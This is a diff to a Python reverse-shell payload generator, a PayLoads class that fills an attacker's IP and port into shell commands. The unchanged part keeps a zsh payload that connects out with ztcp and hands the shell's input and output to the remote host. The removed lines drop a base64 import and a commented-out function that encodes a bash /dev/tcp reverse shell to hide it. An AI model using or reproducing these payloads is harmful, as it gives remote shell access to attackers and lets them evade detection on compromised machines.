@@ -1,6 +1,3 @@
-import base64
-
-
 class PayLoads:
 
     def __init__(self, ip, port):
@@ -43,12 +40,6 @@ class PayLoads:
         # zsh payloads
         ZSH = f'''zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\''''
         return [value for name, value in locals().items() if name.isupper()]
-
-
-# def encoded():  # Going to add more payloads for this one
-#     cli = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'".encode("utf-8")
-#     encoded = base64.b64encode(cli).decode('utf-8')
-#     cli2 = "bash -c '{echo," + f"{encoded}" + "}|{base64,-d}|{bash,-i}'"
 
 
 # NodeJS   --> will be an option to use because its a special case
